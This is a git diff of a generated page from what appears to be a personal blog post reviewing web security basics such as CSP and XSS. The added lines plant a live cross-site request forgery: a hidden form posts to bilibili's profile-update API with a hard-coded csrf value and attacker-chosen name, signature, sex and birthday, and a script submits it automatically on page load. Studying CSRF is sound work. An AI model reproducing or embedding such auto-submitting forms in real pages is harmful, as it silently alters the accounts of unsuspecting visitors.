@@ -13,7 +13,7 @@
 <meta property="og:url" content="http://hijimo.github.io/2019/01/25/复习--web安全基础/index.html">
 <meta property="og:site_name" content="hijimo">
 <meta property="og:description" content="CSP内容安全策略（Content Security Policy），用于检测并削弱某些特定类型的攻击，包括跨站脚本 (XSS) 和数据注入攻击等。CSP通过指定有效域（或者说白名单）使开发者有能力减少或消除XSS攻击所依懒的载体（XSS 攻击利用了浏览器对于从服务器所获取的内容的信任。恶意脚本在受害者的浏览器中得以运行，因为浏览器信任其内容来源，即使有的时候这些脚本并非来自于它本该来的地方）。另">
-<meta property="og:updated_time" content="2019-01-26T04:26:22.091Z">
+<meta property="og:updated_time" content="2019-01-26T04:32:39.120Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="hijimo">
 <meta name="twitter:description" content="CSP内容安全策略（Content Security Policy），用于检测并削弱某些特定类型的攻击，包括跨站脚本 (XSS) 和数据注入攻击等。CSP通过指定有效域（或者说白名单）使开发者有能力减少或消除XSS攻击所依懒的载体（XSS 攻击利用了浏览器对于从服务器所获取的内容的信任。恶意脚本在受害者的浏览器中得以运行，因为浏览器信任其内容来源，即使有的时候这些脚本并非来自于它本该来的地方）。另">
@@ -128,21 +128,10 @@
 </ol>
 <iframe name="badboy" display="none" id="badIframe">
 
-<p></p></iframe><p></p>
-<script type="template" id="tpl">
-    <form method="POST" name="transfer"　action="https://api.bilibili.com/x/member/web/update">
-        <input type="hidden" name="uname" value="你们">
-        <input type="hidden" name="usersign" value="偷偷的来">
-        <input type="hidden" name="sex" value="保密">
-        <input type="hidden" name="birthday" value="1900-1-1">
-        <input type="hidden" name="csrf" value="44859482995b0e7dc27fc0cd8bf0196f">
-　</form>
-    <script>alert(1);debugger;document.forms['transfer'].submit()</script>
-
+<p></p></iframe><br>    <form method="POST" id="bilibili" name="transfer" 　action="https://api.bilibili.com/x/member/web/update"><br>        <input type="hidden" name="uname" value="你们"><br>        <input type="hidden" name="usersign" value="偷偷的来"><br>        <input type="hidden" name="sex" value="保密"><br>        <input type="hidden" name="birthday" value="1900-1-1"><br>        <input type="hidden" name="csrf" value="44859482995b0e7dc27fc0cd8bf0196f"><br>　</form><p></p>
 <script type="text/javascript">
     document.body.onload = function() {
-        var form = document.getElementById('tpl')
-        $("#badIframe").append($(form.text))
+        bilibili.submit()
     }
 </script>
 
@@ -154,7 +143,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://hijimo.github.io/2019/01/25/复习--web安全基础/" data-id="cjrcz3l6n0037r23gpc9q7gei" class="article-share-link">Teilen</a>
+      <a data-url="http://hijimo.github.io/2019/01/25/复习--web安全基础/" data-id="cjrczc8h1003drk3gwv84bfaw" class="article-share-link">Teilen</a>
       
       
     </footer>
